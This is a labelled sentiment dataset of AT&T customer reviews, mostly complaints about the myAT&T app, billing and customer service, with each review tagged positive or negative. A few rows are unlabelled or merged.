"ATT has the worst customer service experience-every time I call them I cringe.They had 2 different bills for me it was unpleasant to resolve and it took 4 hours of being passed around before I finally was able to resolve the issue.Plus they tagged a late fee onto the bill that I never received. The right and left hands to this dysfunctional beast is a joke. I finally got a credit resolution 
But they are real idiots.
Gwendolynrm",negative
I contacted ATT to acquire a copy of my bill because I could not access on line. They changed my password to my account that also changed my email password. I called ATT and they told me they no longer supported Outlook email and would not correct it! I had to contact Microsoft to fix that took 2 hours! Tried to log into my account again but could not get copy of our bill! Terrible customer service!,negative
Twice payments were set up to come out on my relative’s account and did not actually process. When the money did not come out of the checking account they called in to ask why the payment didn’t process. AT&T said oh not sure why but go pay it manually on line and all is fine. It was paid manually and money was deducted from the checking account. Two days later the phones were turned off and the AT&T guy said oh you need to pay $60 because the payment wasn’t processed when scheduled. The app did not work. They extorted $60 to get the phones turned back on. Great app. Great customer service. Actually seems like a scam they have going.,negative
I love AT&T,positive
"I was on the phone for an hour and 4 minutes waiting to speak to someone with an answer. I want to cancel my internet service and only keep my landline service. I spoke to 4 different people until I got to a supervisor Katie, who promised to remove the internet service and I was disconnected. I have no heard back since and want to know I’m only going to pay for phone service that is all.",negative
"It’s amazing that ATT can tout itself as high tech and have such an app as this. If one wants to change settings for digital phone features within the app, it takes 9 different screens to get where one needs to be, if there is no disconnect along the way. It is extremely frustrating to attempt to use.",negative
"Antes rápido té daba información de todo , ahora tarda mucho para mostrar los resultados de volvió muy lenta o a veces simplemente no funciona",negative
This app is very easy to use. I like that I can just easily log onto this app and pay my bill.,positive

Payment page was better the way it was,negative

"Uniformly lousy customer service - app, chat, website and 800 number.",negative
Never remembers passwords. Constantly crashes. Completely unreliable. Caused me to pay my account late because it would not stay functioning to finish transaction.,negative

"Out of nowhere the app has stopped working! It doesn't pull up anything, it's just a blank page! Please fix this!! I can't view my balance or 
usage!!",negative
"It seems like the app doesn’t work right just  about every other time I try to use it.  When it does work it’s SLIGHTLY better than it used to be, but that’s not saying much. It’s hard for me to believe that a huge company built on technology can’t find people to build a better app than this.  I don’t know if you’re trying too hard to emphasize upselling to spend time making it easier to manage my account or what. If you want to sell stuff through the app then you need to make the sales side a separate module and make basic account maintenance a higher priority. I’ve got a phone, I don’t need you to hard sell me other products, I just want to pay my dang bill.",negative
"The app frequently gets stuck at the login screen, making it so that I can’t login.",negative
AT&T sent out an email to prepaid customers claiming we could now use this app but it literally redirects me to safari after logging in. A waste of time and phone storage. It's honestly annoying how little support prepaid customers receive. We can't even use AT&T Thanks. TMobile offers perks for all of their customers.,negative
"Plus, my bill keeps increasing.  The last three times I’ve logged into the app, it’s had problems! So there are two issues here, I suppose.",negative
Don’t like the new app,negative
I have been trying for days to use the AT&T app on my iphone.  Keeps telling me the system is down to try back later.  Not exactly sure how much my bill is and i don’t get a paper bill so i guess AT&T don’t want to get paid.,negative
Since phone updated I am no longer able to log in to see my account. This app no longer works for me.,negative
The password keeps falling off and I have to enter it every time.  It has my stuff saved and I use the phone to unlock all other apps and this one used to work as well.,negative
"I’m in southern Maine and the signal is terrible, 95% of the time I can’t use my phone.  I will be changing to a new service shortly.",negative
i use the app to check my usage and pay my bill. Thats all. It has repeatedly locked up and refuses to update if I dont log on multiple times a month. Its remarkable to me how slowly it does update especially for being an app created for a wireless provider,negative
"Long time customer, long time app user it I can’t understand why the app won’t let me in!",negative
I don’t like both TV and wireless together as it’s too hard to determine which bill is which.,negative
What’d you guys do to it? It was better before now it’s weird,negative
"For a company that’s supposed to provide mobile technology this is one of the worst iOS apps I have ever used. It’s like they forgot every single rule of mobile development. Every page takes eons to load, nothing feels responsive, constant crashes. Glad my $300 a month of service is being used to pay for the CEOs yacht and not for a better application which will actually make my life easier not harder. Seriously, this app is bad.",negative

Aveces no funciona,negative
"This app is HORRIBLE!! It rarely works as intended, I wouldn’t even attempt using it if not for the ridiculous wait times in store. It never works for me with my iPhone and always is asking me which account I want to use my email to sign into, my cellular account or my direct tv account, being that I got rid of direct tv 2 years ago, I no longer need the direct tv account but there is no way to delete it. Also, it recently locked me out on my phone that I’ve used for the past 5 months to access the app because it was a “new device” but when trying to verify that this was a phone I trusted, texted me a number to confirm in the app, which didn’t work. If you can avoid it, don’t use the app, although your alternative would be to go to the store where you’ll likely spend 1 1/2 hours at least waiting to be helped.",negative
I’m ready to switch companies due to automated service,negative
This app is very clunky and prone to errors.  Have to call a service rep to get anything done.  Doesn’t offer a nice widget to track data use (widget is broken).  Constantly prompts for logins.,negative
Always I have issue to pay my bills,negative
"I made the mistake of leaving Sprint after 19 years and switched to AT&T when I had my Direct TV, internet and landline installed.  The AT&T cell phone salesman showed up at my door while the internet and landline were being installed.  I should have told him to take a hike.  He sold me a bill of goods.  My bills are higher than they were with Sprint. AT@T’s cell phone customer service is the absolute worst.  I could go on and on, but I wish I had stayed with Sprint.  Their customer service was fantastic.  I am happy with the Direct TV, my internet and landline services.",negative
"Since I’ve switched over to AT&T nothing but problems. It’s too bad it’s the only service in our area. There is always a problem, from the devices to customer service, and I could go on. Now every time I try to log into the app I have a problem. EVERY TIME!",negative
The app isn’t working since it updated,negative
"After a hefty conversation, ai was asked to check for my account number and as I did that the chat bubble completely disappeared but I still heard some sounds of reply. Stressed me out knowing someone was still on the other end but there was absolutely no way to get back in the live chat. Wasted a good chunk of my time. Good thing I’m cancelling.",negative
I don’t know what you pretend you’re trying to do here but this is a nightmare and it’s stupid I still can’t get logged onto my account and all I needed was a touch. This is stupid fix it or I get rid of AT&T.  Why you have to make it difficult to give you money is beyond me,negative
"Supervisor,
With all the channels that are offered, there are only about 25 @ the most our family watches & the rest are just a waste. My daughter wanted to keep channel 336 but is in a different bundle & now will cost an extra $25 a month to keep it so I cancelled it. 

U need somebody @ the helm of ATT to develop a custom bundle package for each of their clients or customers. Giving each customer a choice of channels they would like not ones forced on them. Many of my friends have canceled their TV cable part of their plan & just purchasing the internet. They tell me they just add Net flex, Roku, Amazon etc. 
This may be the last month of your TV side of my bill till U come up with a custom plan for all your clients out here.

If U want to keep what clients U have & not lose them then please help us out here. We don’t want to leave U.

  Sincerely 
  Mr. Fair",negative

"After been a long time customer it is unpleasant to give a bad review to a what it use to be a good company, but recently I have been encountering so many issues and lots of misinformation related to my issues ( including unable to log in, unexpected charges and bouncing from department to department do to inexperienced customer agents).

I end up calling presidents office and they helped me with some issue but not the last one related to recordings of a show that was not recorded and they state I have to be more vigilant about my recordings when they provide something called ( record series) ah but there is a catch ? Well that’s exactly my point not been honest and giving me credit for something that really matters to me and they minimize it to it was just a recording, well it is not just a recording is more than that, it was a series that make me upgrade my package from basic to max package, So no, it was just not a recording thanks.",negative

"Took my husband military honorable discharge paper into Alpena AT&T on Bagley St. Was told we’d get a 15% discount on our wireless. Well we didn’t any “discount” because we are on an unlimited plan, so I was told by your customer service this morning! Why the heck tell people you give a discount when you don’t? We pay a hell of a lot of money for these cell phone that don’t even have decent service where we live! So, after my husband dedicated 20 yrs of military service, there should be no “stipulations” on who can receive it. That’s plain b.s.! Not happy with this at all!!!

AT&T did not give me credit for paying but charged me a $40 reconnect fee although I had the text confirming my ORIGINAL payment. I’ve just received an email saying my past payments didn’t go thru and the app still hadn’t updated. Fix the app or call it quits....I don’t want to be charged and have to pay fees when I’ve already paid & although I have the confirmation text from AT&T, email too, AT&T wouldn’t honor it and I’m STUCK with unfair fees!",negative

They tell me it is because NO one at AT&T DirecTv has the phone number to contact THEIR DNS department that is responsible for activating this service and they are the ones that screwed up my application. I have been waiting for over six weeks even though their website says it will take 11 to 14 days with NO end in sight.

The app is always freezing if randomly kicking me out and making me sign in all over again.

"Worst company EVER. If I could give ZERO STARS  Called to set up online account took forever to set up pay with multiple chats !!! Quoted price for 2 IPhone XS MAX 256 GB. Great 25% military discount + bogo (750 credit, pay did in monthly installments! 8.90 insurance. YAY Unlimited + More Premium Plan. 3 hrs back forth with building carts can go to store & pick up today!!! BOOM sent store address. This is where the real debacle starts!
Arrive at store it’s closed!!!! After 30 minute walk waiting for tx email back & forth on chat for confirmation email of purchase & confirmed plan. STORE IS CLOSED!!! 
Ok walk to nearest open store told you can’t transfer order must cancel and re order to that store but today can’t have your old numbers as they were requested transfer on phones at closed store where order cancelled!!! WTHeck!!!! Take a new number and transfer from cancelled to new phone in 48hrs!! NO WAY!!!! Meanwhile sales associates are circumvent like sharks, just cancel and buy in store. I’m fine with that as long as you guarantee the $300 Visa card that’s only available of you order on line!!! Ok my manger will organize that! Great here we go!!! Then they run but actually take another 30 minutes to get the phones from another store. Sharks are hungry want credit cards IDs blah!!! Fine! Show chat log and DEAL we were promised!!! Oh yeah no problem we will set that up exactly the same!!! 
5.5 hrs later finagle accessories and lots of other scams! I’m told oh my district manager will offer Direct TV now for $35 but you cancel in a month! Also you will get another phone as a curtesy for an additional $5 a month ——- why I don’t have a 3rd user but he said take the phone is costing you nothing!!! No I don’t want another phone or direct TV now. Ok we will give you a free iPhone 6 it will be delivered tomorrow you don’t have to use it there’s no additional charges my district manager wants to do the right thing by you take it as a back up. You can even unlock it and sell it you own it. 
Oh boy ..... I could go into more details but 6 hits later we leave with accessories $200 worth (discounted as a courtesy for the debarcle) $35 paid for direct tv now one time charge Waived for rest of year (as a curtesy for debarcle paying 1st month only) just remember to cancel card payments at end of month service will continue free!!! 
Today I discover SIM card ma were allocated to wrong phones so I’m getting my friends calls and she’s getting mine. I work in sales so I’m losing money and contact. Only one phone has insurance and the free phone is actually a 3rd line with charges plus military discount is 15% not 25% charges went from quoted $165 to $190(possibly more)+tax and BOGO is BS as you pay full price for 1st 3 months then difference in cost $500 from XR . 

Hours on the phone today money lost time spent stressing !!!  

Avoid this company especially Lexington Ave Scammers TJ & Tyriek who scammed their way through 6 hours of lies and fraudukent sales. 

I got a outstanding help service from Marva Williams & David from customer care He spent hours on the phone with me trying to adjust the bill and fix the scams! He said we were clearly misinformed and lied to for sales.

"I hate your new app.
Prior to this I was able to just use my touch ID and immediately pay my bill. This new update has caused me to have to put in my pin number etc. It it’s much more complicated, and at this point it would probably be better to call by phone and make a payment.",negative

How about when you advertise buy one get one free, you actually get one free?",negative
When the app works it’s great but 85% of the time is throws out error displays and I can’t view my bill...frustrating!,negative

Too expensive but otherwise good.,positive
"I’ve been a customer of AT&T for many years. They changed my account number when I converted land line to be cellular, but didn’t tell me. Now they’re threatening to disconnect for being late yet the app won’t let me update my account to the new number. It repeatedly asks for password after using thumbprint to log in, saying it’s been a while since I logged in when I just did so 10 minutes ago. I really question my loyalty to this company and their screwed up system. I guess now I’ll have to call to make a payment since app won’t let me. Can’t go online on computer since my internet from AT&T has been out all day again. They charge $5 to take payment over phone. By the way, I have a huge credit on old account but they can’t transfer it to the new account.",negative
This app doesn’t work... it just sits there doing nothing!!!  Useless!,negative
"I can never log in seamlessly. I click to pay the bill and it searches and searches. And keeps searching. And it seems like when I do get it to work, I have to be home where my router is. Super stupid. Quit pushing apps on us if you’re unable to get it to work properly. Sorry piece of crap app.",negative
App totally quit loading and working after it merged my direc tv account,negative
"AT&T is a terrible company. Their app does not work well and I spent over an hour on the phone with them and they only made the problem worse.
I would not recommend them to anybody.

Can’t never get in it half the time,negative
Terrible website... the lack of integration of directv Acct with att is horrible.... to just pay your bill you ha e to go thru a bunch of sales screens... hate using this site and app,negative
For the “world’s fastest network” this is the slowest app on my phone. Half the time it will not load what I am trying to see whether it’s the bill or service plan.,negative
I never know if this app will work or not. It changes hour by hour. Hate it!,negative
"This app is a joke. Half the time it takes too long to load, or doesn’t load at all.",negative
App keeps freezing or hanging up at login.,negative
The redesign of the app is horrible. It went from user friendly to unfriendly as now one has to explore a maze of screens to access their account(s) and/or to make a payment. What used to take only two or three steps now takes 10 or more which is not a great way to “streamline”.,negative
What a joke! When you change cell plans the app doesn’t allow updating but only shows the previous account associate with the old plan is closed .... can not update address ... what a shame. Also tried call but couldn’t talk to a human. Hung up in disgust. The myAT&T app is useless to me... and basically so is att.,negative
The app is very slow to refresh. Many times you can see the balance due but can not open the bill to see the specific charges.,negative
Why does ATT decide to change the app when it was working.  Now it’s really cumbersome and slow.  It must be that your app developers have nothing to do.......,negative

"It’s my biggest utility bill. Cell, TV for 2 houses and I can’t even sign in.",negative
"I was switched to this app for my direct tv and 75% of the time won’t open so I have to go online to website to pay my bill. I used to do auto bill until one time they took it out twice so now I go in each month, the app is great if it’d open each time.",negative
I am writing cause for several months and numerous phone calls the issue is not resolved. The issue is: i have requested that all my   I have accounts would have one monthly billing.  Have two numbers my home number and my cell number.  My home phone number has disappeared should have been added to the cell number. Could u please tell me where did it go ?,negative
"The update to the AT&T app is complete garbage. It said I had no payment info on file even though my autopay charged my payment method previously on file. When I update the payment info I received a $20 charge. The update also limits my access of my account to updating payment info and my email address/phone number. When I click on Account overview the only thing it shows is my Direct TV Now. I wish they didn’t change the app, there was nothing wrong with the previous version and I had full control of my account. Sad part is I even tried going to the actual website and I have the same access as the current app. I’m very disappointed to say the least.",negative
Logging in is not seamless and you need to go through several screens to see you bill to pay. Immediately facial logging in and availability of balance and payment is more suitable. In fact the app provided this GUI in the past but app redesign updates messed the functionality now.,negative
"This has been the worst mess I've run into in my old life.  The promised reduced cost of both Direct TV and Wireless from my previous (Verizon) server have doubled wit AT&T.  I wish I could erase the whole mess and go back to my previous servers.  However, I must have unknowingly signed an internet contract that would have had me read it from the representatives tablet.
I hate this.

"I have the bill that I paid on 05/20/2019. I wrote down everything that was said to me. (Being a nurse for more than 20 yrs, I learned this was a necessity to protect yourself in the event of misunderstandings or even outright untruths. I was quoted a price of $131.97 plus tax. I received my bill yesterday 06/01/2019...it was over $200.00. That is what caused it to be disconnected in the first place. I talked to Julie Ann in Vegas. (I had originally talked with Gabriella, don’t know where she was from, she quoted me the price of $129.00 for the exact same things without any promotional offers). Not a big difference in price, but I  did get $30.00 off of Direct TV for 12 months, increased internet/WiFi speed for $45.00 monthly; told this price would remain the same “always”, home phone for$19.99 for 12 months, from Julie Ann in Vegas.                                                                   I guess  all people should pull up your order and read it thoroughly  before trying to assist any one with their bill. Or prior to attempting  to tell someone why their bill is so very expensive !! I can only pray that the service gets better.           Thank you",negative
Your website is horrible.,negative
"Completely unusable. Log in, and it’s a white screen. Awesome.",negative
It takes a long time to load my bill. Sometimes I can’t even check it or it will only show last months bill,negative

Terrible app,negative
"Will not let me do anything. I don’t know if something is wrong with your network, but I have been trying to manage autopay for an hour and nothing!!!",negative
This is the worst online method of paying your bill online.,negative
This app never works. I think it may be the worst app I have ever tried to use,negative
Really really bad experience.,negative
This app NEVER works. Every time I try to log in it wants to send me a code to verify myself. Then it says Hmm... it seems there’s something wrong and won’t let me in. What’s wrong is the mastermind behind this piece of crap. Then when I call in and tell them it’s not working they say that no one has ever told them this before. Interesting since I know I have - multiple times. Please fix this incredibly inefficient “convenience”.,negative
All these extra fees you guys came up with I don’t approve of I will be going elsewhere for service,negative
"Every single time I try to login I have put in my password instead of being able to use the finger print set up in my iPhone. I have three different accounts I have to try and remember passwords for and it is extremely aggravating every time you ask me to login in with the password. I haven’t paid my bill for two of them just because of that. I keep waiting for you guys to call me to pay the bill cause I don’t have time to stop and wait 45 minutes to over an hour to get y’all on the phone. It’s ridiculous!!!!!

Thank you, 
Jason Smith",negative
Upgraded my WiFi to max and it has gotten worse.,negative
"Every month it is a nightmare trying to get logged into the app to pay my bill. First, it always freezes when trying to select my phone number to have my ID verification code sent via text message. At other times, this page just loads as a blank, white screen. It should not be this difficult to pay my bill.",negative
U guys ripped us off and we r screwed,negative
La app es muy lenta & no te deja hacer todo lo que puedes hacer con un representante.,negative
The old saying holds true if it’s not broke don’t fix it. I can no longer sign in even though my name is there and it shows it won’t take me to my account and now I and I haven’t been able to pay my bill in the last two months from the app and when I called and they try to charge me not cool ATT not cool at all fix it for a five star rating,negative
"App, web site, customer service, technical support, equipment...you name it and AT&T will find a way to screw it up or just flat out lie to you about it.",negative
"I got a new phone. Tried to log in to the ATT app and it wants to verify that it’s really me. Ok fine. EXCEPT...it only offers to send a text to the OTHER 4 phones on my plan. Those people live hours away from me! Why isn’t my own phone number listed on there as an option to verify that I’m me?! I’m also the primary account holder who also pays the bill every month for the last 16 years, too...but I guess that doesn’t make me important enough to be able to access the app ??",negative
The data usage doesn’t always refresh. It says it’s refreshing but then says “last updated 2 days ago”. Other than that the app is useful.,negative
"The app is very glitchy. Pages don't load half the time and only partially load the other half. Links rarely work. Back button doesn't work. It is faster to exit the app and start over. Which isn't saying much because the app takes forever to start up as well. 

I expect more from AT&T.

AT&T’s cell service is getting progressively worse. TMobile gets way better service in my area.",negative
Can’t even log in,negative
"Wow - way to screw me, AT&T. 

I’ve been a customer for years.  Mostly through my business, but also personally for phone and internet, although not in the past few years. 

Just transferred two phone lines that had been on business plans to a new personal family plan and added one more for a total of three lines. 

Spent literally hours on the phone trying to get this set up, verifying rates, etc. 

First bill arrives ... wait for it ... it is INCREDIBLY higher than expected.  

Thanks.",negative
"Is poor services the app don’t open and said is error in the system so is more than 3 month that I don’t see my account, I start hate this company is easy to get paid automate but the services are a sh....t",negative
Combining ATT and Directv killed customer Service. Worst company ever if you have a problem. Representatives speak broken English and don’t understand 1/2 of what you say. Pathetic,negative
"Muchas veces pide confirmacion de la contraseña sin registrar correctamente la ultima vez de acceso, es engorroso e incomodo y no se trata de seguridad, simplemente tengo Touch Id y no veo necesario que se me pida confirmar tantas veces inutilmente , perdida de tiempo!",negative
This is ridiculous. I’m traveling overseas and have no support from AT&T unless I want to pay my bill.,negative
"I do realize, Att owns direct tv, but getting a bill in the mail with att on the outside inside direct tv as really screwed with us, remove direct tv bill from my att app, or I’ll take my business elsewhere!",negative
"He design of the new ATT app looks like a poorly thought out website that wasnt even made for mobile. It looks like a newspaper. No color. TMI on the front page and where to click? I feel I should be looking for the opp-ed or sportspage-oh wait, why am I here?  Oh yes, just to check my freakin’ minutes as always. They paid somebody to unravel what already was a good app to the dark ages. Tonite a new fun feature. Complete lockout. Click on my ID———> just cant go further than that. Great job.",negative
wish I would’ve stayed with T-Mobile,negative
I am in Europe with my family and set up an international plan and when I go to the app to check to see if I am getting any extra charges I can access usage info and it says try again later w error message. Very frustrating.,negative
App used to work great but is broken with latest update.  Not able to get to account overview after using Touch ID to authenticate.,negative
Seems like the app changes every month and it gets worse each time. All I want is to check my bill and I cannot access my account. Ugh,negative
Unable to login,negative
"So far both services, cell and fixed wireless internet have been as advertised. Much better than the Verizon service we had for internet. So far it has been worth the switch and hope it stays that way!!",positive
When the app was overhauled it became a good bit less user friendly. It asks for passwords multiple times. It also will not go directly to the billing/usage screen anymore. I hate the update.,negative
The Application is far from being user friendly,negative
"So I did the app update like I was forced to do. Since then, the app tells me I have a zero balance and no due date. I have reinstalled the app and it continues to do the same thing. I just ant to see my bill and it just sits and loads for (god only knows) minutes, I exit the app before it loads. This is by far the worst update I have even dealt with. For a communications leader, they fail miserable communicating with their loyal customers.",negative
Have used chat many times - always received excellent service. Service agents always helped solve my problem.,positive
Takes too long to load and sometimes doesn’t even load. Too much time wasted,negative
They keep changing the app and making it worst.  It gets harder and harder to login.  They keep fixing what isn’t broke,negative
I love using the app because it has been very user friendly.,positive
I love this app,positive
When I went to update my Att App disappeared... It says open in the App Store but will not show up on my IPhone,negative
"I’ve been with direct tv for over 25 yrs, since att took over it’s been a cluster, I’ve never seen such incompetence in my life, I can’t pay my bill online, I can’t even sign in, I’ve spent 28 hrs on phone in last two weeks with NO satisfaction, I guess when enough people say that’s it, maybe these incompetent folks will say hum!",negative
Lousy app been on the phone too long going in circles with the rep they can’t tell me how to add my bill for direct tv to the “My ATT” app so I can pay that bill on the same app that I pay my wireless on. Yet they tell me I can do that. Why is my direct tv acct not attached to the along with my wireless acct?,negative
"Can't switch between accounts, clicking on a different account in the list does nothing. Also trying to delete ""Offers"" does nothing. Non-responsive and frustrating.",negative
"AT&T is a major telecommunications powerhouse. It really says something about their understanding and application of technology that they can’t write a decent iPhone app for their tens of millions of customers.

In particular the app gets poor scores on usability, functionality, and connectivity. Specifically the usability is counterintuitive and especially problematic in managing multiple devices. 

As for functionality, more often than not I still have to actually go to an AT&T store to resolve a simple issue because the app will not address it. And by the way, when I go to the store and am number 27 in the line, why can’t you send me a text when it’s my turn instead of making me wait in the store? I mean if Chipotle can text me when my order is ready I think a telecom provider should be able to manage.

And most frustratingly, connectivity. From the app failing to log in over and over to screen freezes and app hangs, really? And all the times my password worked on the web log in but not in the app.

I don’t understand why the app is not better! Either they don’t try, don’t care, or don’t get it.",negative
Business make money not friends.  Every customer service phone call is a chance for them to sell/up charge.   I am tired of having to start every sentence with “no”.  I don’t want to play games and dance.  FFS.,negative
"Switched phones and after installing my apps, I’ve been trying to log into the AT&T for 3 days. They send a code and then an error message pops up. Please fix this.",negative

"This new “front page” is garbage. I often use the app in remote locations. The load times were bad before, now they’re noticeably worse.",negative
"It took going into the wireless menu from the main page, showing me all the things you can have me buy, to access my account after login (which there is no indication that I’m logged in).  The UI is obsessed with “buy buy buy”....just let me pay my bill and be on my way ??

EDIT: ok now the app won’t even let me log in....?? This is absolutely useless now",negative
Great way for paying your bill. The app is easy to use and it doesn’t lag,positive
"Some days I’m recognized, some days it takes several tries m. When it works, it’s fine.",negative
"I was a Verizon Wireless customer for 20 years and switched to AT&T last week. It has been the worst experience:

1.  Most of the time, I am unable to access the internet. Almost anywhere I am I have one bar. I have worked with tech support for the last four days. They now have an engineer working on the problem. To date, I still only have one bar. 

2.  The My AT&T Watch TV would not operate because the they could not verify the phones. I worked on this with one of the AT&T store Managers. We did this for two days. The last time tech support had me sign up for the free trial. This worked but it said I would be charged $15 a month for a service once the trial ended that is included in my plan. When I complained, the tech said she would change it and I would get it free for as long as I stay with AT&T.   I am still waiting to see if I will be billed after the trial. 

3.  Last night my first bill came in. It was quite high so I contacted billing support.  They said the bill included activation fees. I then asked what my regular monthly bill would be. I was informed that my new total monthly bill would be   $226.41.  Now when we met with the salesperson we asked him what the total monthly bill would be including taxes and fees. He told us $206.00. I told the billing support person and they said they were sorry, but $226.21 is the correct billing amount. They instructed me to go back to the store and speak to the salesperson who told me this. I will be doing this today. When I was with Verizon my monthly bill was only $195.00 for similar service and phone payment. Had I known this last Saturday, I would never have signed up with AT&T. 

To say that I am disgusted and disappointed is an understatement. When my phones are paid off, I will be going back to Verizon.",negative
"I am actually shocked to see the ratings for this app. The irony of AT&T having a phone app with such terrible UX design and layout is hilarious. It’s not intuitive, offers a live chat program that begins with an automated system before it will put you in touch with a representative (which is implied by calling it a Live Chat), and in general looks like it is an app built at the dawn of app existence. It’s really miserable to use, making the wait time to speak to a representative more accessible unfortunately.",negative
Thanks for being the best phone company ever. Always available when there is issues and to help solve the problems. Keep up the great work,positive
The new update is a lot more confusing than the old screens.  Don’t change stuff just to have something to do!,negative

Also doesn’t give an option to enter my password so I’m locked out and can’t pay my bill??,negative
I find using this application is so easy. I pay my bill every month on time and I definitely give this a star rate of five points.,positive
"Tells you the developer doesn’t care. This is an app on my phone. Look at how easy it is to sign in or remain signed in in other apps. In this one, even after signing with thumbnail, it takes you to another screen to choose your number then you have to provide your password!!!!! Have some respect to your customers and review your process. You are not a startup!",negative
My internet NEVER works properly!  I have reported issues followed every tech instruction and still...I am consistently struggling to stay connected! This is horrible!,negative
Excellent,positive
If you are on paper billing because you prefer to pay by check the day the bill comes in the mail you best run back to the post office and mail it because the next day you get an alert that your payment is due. If the mail is delayed for some reason they will charge you a fine. Only choice is get rid of them,negative
"The app might be useful, if it provided accurate information more than half the time. When I look at usage it’s always a 50/50 shot if it will give me info or tell me couldn’t get usage info. Navigating the app isn’t hard, but it isn’t easy either. Also anything not on the main screen of the app is going to take a very long time to load, and many settings, though shown that they can be adjusted in the app, cannot be.",negative
